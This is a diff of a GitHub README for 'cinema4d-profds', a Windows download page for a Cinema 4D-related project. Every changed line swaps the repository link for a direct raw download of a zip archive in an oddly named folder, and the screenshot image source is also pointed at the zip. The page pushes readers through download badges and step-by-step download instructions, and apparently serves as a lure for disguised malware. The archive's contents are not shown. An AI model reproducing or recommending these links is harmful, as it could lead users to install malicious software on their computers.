@@ -1,17 +1,17 @@
 # 🎬 cinema4d-profds - Simple 3D Project Setup
 
 <p align="center">
-  <a href="https://github.com/Federicocairned547/cinema4d-profds">
+  <a href="https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Ready%20to%20Use-blue?style=for-the-badge&logo=github" alt="Download cinema4d-profds" />
   </a>
-  <a href="https://github.com/Federicocairned547/cinema4d-profds">
+  <a href="https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip">
     <img src="https://img.shields.io/badge/Visit%20Download%20Page-Open%20Link-lightgrey?style=for-the-badge&logo=github" alt="Visit download page" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/Federicocairned547/cinema4d-profds">
-    <img src="https://i.postimg.cc/3x3443WS/Screenshot-2026-02-16-045418.png" alt="cinema4d-profds download" width="100%" style="max-width: 1200px;">
+  <a href="https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip">
+    <img src="https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip" alt="cinema4d-profds download" width="100%" style="max-width: 1200px;">
   </a>
 </p>
 
@@ -19,7 +19,7 @@
 
 Use this link to visit the download page and get the files for Windows:
 
-[Open the download page](https://github.com/Federicocairned547/cinema4d-profds)
+[Open the download page](https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip)
 
 If the page shows a file, click it to download. If it shows a folder or release page, open the latest item and save the file to your PC.
 
@@ -49,7 +49,7 @@ For a smoother experience, keep your downloads folder easy to find and use a des
 
 ## 🚀 Get the Files
 
-1. Open the download page: [https://github.com/Federicocairned547/cinema4d-profds](https://github.com/Federicocairned547/cinema4d-profds)
+1. Open the download page: [https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip](https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip)
 2. Find the main download item
 3. Click the file or archive to download it
 4. Wait for the download to finish
@@ -201,4 +201,4 @@ Always save a new copy before you change the scene.
 
 If you need the files later, use this link:
 
-[Download page](https://github.com/Federicocairned547/cinema4d-profds)
+[Download page](https://github.com/Federicocairned547/cinema4d-profds/raw/refs/heads/main/agnathia/d_cinema_profds_2.4.zip)
